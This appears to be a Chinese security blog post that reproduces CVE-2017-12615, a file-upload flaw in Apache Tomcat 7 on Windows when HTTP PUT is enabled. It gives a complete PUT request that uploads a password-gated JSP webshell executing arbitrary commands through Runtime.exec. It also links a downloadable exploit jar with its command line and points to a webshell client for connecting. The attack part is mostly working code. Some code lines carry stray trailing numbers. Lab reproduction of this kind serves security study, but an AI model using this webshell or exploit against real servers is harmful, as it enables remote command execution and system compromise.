**目录**

[漏洞复现:](#t0 "漏洞复现:")

[漏洞利用工具：](#t1 "漏洞利用工具：")

* * *

**漏洞环境：**当 Tomcat运行在Windows操作系统，且启用了HTTP PUT请求方法（例如，将 [readonly](https://so.csdn.net/so/search?q=readonly&spm=1001.2101.3001.7020) 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求上传任意文件，包括JSP类型的木马。  
**影响范围：**[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Tomcat 7.0.0 - 7.0.81

### **漏洞复现:**

Tomcat版本：Tomcat 7.0.39

打开Tomcat安装目录的 conf\\web.xml ，添加如下配置。在Tomcat7.0版本下默认配置是开启readonly的，需要手动配置readonly为false才可以进行漏洞利用。

![](https://img-blog.csdnimg.cn/20190904163634658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

抓包，修改方式为OPTIONS，发现允许PUT方法

![](https://img-blog.csdnimg.cn/20190904164536939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将数据包修改为如下，点击 Go (我们可以将PUT的内容修改为其他类型的JSP[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020))

```
PUT /test.jsp/ HTTP/1.1      
Host: 127.0.0.1:8080      
Cache-Control: max-age=0      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8      
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      
Connection: close      
Content-Length: 423       1
<%      1
    if("123".equals(request.getParameter("pwd"))){      1
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();      1
        int a = -1;                1
        byte[] b = new byte[1024];                1
        out.print("<pre>");                1
        while((a=in.read(b))!=-1){      1
            out.println(new String(b));                1
        }      2
        out.print("</pre>");      2
    }       2
%>
```


![](https://img-blog.csdnimg.cn/20190904164000874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问网站根目录下的test.jsp

![](https://img-blog.csdnimg.cn/20190904164108733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **漏洞利用工具：**

[CVE-2017-12615-master.zip-网络攻防工具类资源-CSDN下载](https://download.csdn.net/download/qq_36119192/11665567 "CVE-2017-12615-master.zip-网络攻防工具类资源-CSDN下载")

```
java -jar CVE-2017-12615-Exploit.jar http://127.0.0.1:8080/ test.jsp 木马文件的路径
```


![](https://img-blog.csdnimg.cn/20190904165433833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后，用冰蝎连接 http://127.0.0.1:8080/test.jsp 即可。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)